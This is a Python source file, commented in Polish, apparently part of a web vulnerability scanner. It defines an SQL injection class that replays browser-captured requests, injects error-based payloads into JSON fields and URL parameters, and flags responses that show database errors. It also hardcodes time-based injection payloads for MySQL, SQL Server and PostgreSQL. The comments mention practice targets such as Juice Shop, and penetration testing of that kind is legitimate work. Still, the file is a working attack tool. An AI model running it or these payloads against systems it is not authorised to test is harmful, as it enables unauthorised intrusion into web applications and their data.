import requests
import json
from urllib.parse import urlparse, parse_qs
from typing import List, Dict, Any
from playwright.sync_api import Request as PlaywrightRequest

def load_payloads_from_file(filename: str) -> List[str]:
    """
    Wczytuje listę payloadów z pliku tekstowego.
    Ignoruje puste linie i linie zaczynające się od '#'.
    """
    payloads = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                stripped_line = line.strip()
                if stripped_line and not stripped_line.startswith('#'):
                    payloads.append(stripped_line)
        print(f"[+] Załadowano {len(payloads)} payloadów 'Error-Based' z pliku: {filename}")
        return payloads
    except FileNotFoundError:
        print(f"[!] BŁĄD: Nie znaleziono pliku payloadów: {filename}")
        print("[!] Skaner 'Error-Based' nie będzie miał żadnych payloadów.")
        return []
    except Exception as e:
        print(f"[!] Nieoczekiwany błąd podczas wczytywania pliku {filename}: {e}")
        return []


payload_file_name = "sqli_error_payloads.txt"
error_based_payloads = load_payloads_from_file(payload_file_name)

while(len(error_based_payloads) == 0):
    print("Błąd pobrania payload'ów \n")
    payload_file_name = input("Podaj nazwę pliku z rozszerzeniem: ")
    error_based_payloads = load_payloads_from_file(payload_file_name)

TIME_BASED_PAYLOADS = [
    "' AND (SELECT SLEEP(5)) --",  # MySQL
    "'; WAITFOR DELAY '0:0:5' --", # SQL Server
    "') AND (SELECT pg_sleep(5)) --" # PostgreSQL
]

class SQLInjector:
    def __init__(self):
        self.session = requests.Session()

    def _prepare_session_from_playwright(self, playwright_request: PlaywrightRequest):
        """Kopiuje nagłówki z Playwright do sesji Requests."""
        headers = playwright_request.headers
        headers_to_skip = ['content-length', 'accept-encoding']
        clean_headers = {k: v for k, v in headers.items() if k.lower() not in headers_to_skip}
        self.session.headers.update(clean_headers)

    def scan_request(self, playwright_request: PlaywrightRequest) -> List[Dict]:
        """
        Główna metoda. Przyjmuje obiekt Request z Playwright i przeprowadza atak.
        """
        # Ignorujemy zasoby statyczne
        if playwright_request.resource_type in ['image', 'stylesheet', 'font', 'script', 'media']:
            return []

        print(f"\n[SQLi] Rozpoczynam skanowanie zapytania: {playwright_request.url}")
        
        self._prepare_session_from_playwright(playwright_request)
        
        url = playwright_request.url
        method = playwright_request.method
        post_data = playwright_request.post_data

        findings = []

        # --- Scenariusz 1: JSON (np. Juice Shop) ---
        if "application/json" in self.session.headers.get("content-type", "") or \
           (post_data and post_data.startswith("{")):
            try:
                json_data = json.loads(post_data) if post_data else {}
                findings.extend(self._test_json_injection(url, method, json_data))
            except json.JSONDecodeError:
                pass
        
        # --- Scenariusz 2: Metoda GET (Parametry URL) ---
        elif method == "GET":
            # Sprawdzamy, czy w URL są jakiekolwiek parametry (znak '?')
            if "?" in url:
                findings.extend(self._test_query_param_injection(url))

        return findings

    def _test_json_injection(self, url: str, method: str, base_json: Dict) -> List[Dict]:
        """Iteruje po kluczach JSON i wstrzykuje payloady."""
        findings = []
        for key, value in base_json.items():
            if not isinstance(value, str): continue
            
            print(f"  > Testowanie pola JSON: '{key}'")
            for payload in error_based_payloads:
                test_json = base_json.copy()
                test_json[key] = f"{value}{payload}"
                
                try:
                    if method == "POST":
                        r = self.session.post(url, json=test_json, timeout=5)
                    elif method == "PUT":
                        r = self.session.put(url, json=test_json, timeout=5)
                    else:
                        continue

                    if self._check_response_for_errors(r):
                        findings.append({
                            "type": "SQL Injection (Error-Based)",
                            "location": "JSON Body",
                            "url": url,
                            "parameter": key,
                            "payload": payload,
                            "evidence": r.text[:100]
                        })
                        print(f"    [!!!] Znaleziono podatność SQLi w polu '{key}'!")
                        break 
                except Exception:
                    pass
        return findings

    def _test_query_param_injection(self, full_url: str) -> List[Dict]:
        """
        Analizuje URL, wyciąga parametry GET i wstrzykuje payloady.
        """
        findings = []
        
        # 1. Parsowanie URL
        parsed_url = urlparse(full_url)
        # base_url to np. "http://localhost:8080/vulnerabilities/sqli/" (bez parametrów)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # params to słownik list, np. {'id': ['1'], 'action': ['view']}
        params = parse_qs(parsed_url.query)

        if not params:
            return []

        # 2. Iteracja po każdym parametrze
        for param_name, param_values in params.items():
            print(f"  > Testowanie parametru URL: '{param_name}'")
            
            # Zazwyczaj atakujemy pierwszą wartość, jeśli jest ich kilka dla jednego klucza
            original_value = param_values[0]

            for payload in error_based_payloads:
                # Kopiujemy parametry, aby nie zepsuć oryginału dla kolejnych testów
                test_params = params.copy()
                
                # Wstrzyknięcie: nadpisujemy wartość parametru, dodając payload
                # requests.get obsługuje listy w params, ale dla precyzji spłaszczamy atakowany parametr
                test_params[param_name] = original_value + payload

                try:
                    # Wysyłamy zapytanie GET na czysty URL z naszymi spreparowanymi parametrami
                    r = self.session.get(base_url, params=test_params, timeout=5)

                    if self._check_response_for_errors(r):
                        findings.append({
                            "type": "SQL Injection (Error-Based)",
                            "location": "URL Parameter",
                            "url": base_url,
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": r.text[:100]
                        })
                        print(f"    [!!!] Znaleziono podatność SQLi w parametrze '{param_name}'!")
                        # Przerywamy testowanie payloadów dla tego parametru, idziemy do następnego
                        break 
                except Exception as e:
                    print(f"    Błąd połączenia: {e}")

        return findings

    def _check_response_for_errors(self, response) -> bool:
        """Metoda pomocnicza do detekcji błędów SQL w odpowiedzi."""
        if response.status_code == 500:
            return True
        
        text = response.text.lower()
        errors = [
            "sql syntax", "mysql", "you have an error", 
            "unclosed quotation mark", "odbc", "microsoft ole db", 
            "invalid column name", "pg_query"
        ]
        for error in errors:
            if error in text:
                return True
        return False

# Instancja do importu
sql_scanner = SQLInjector()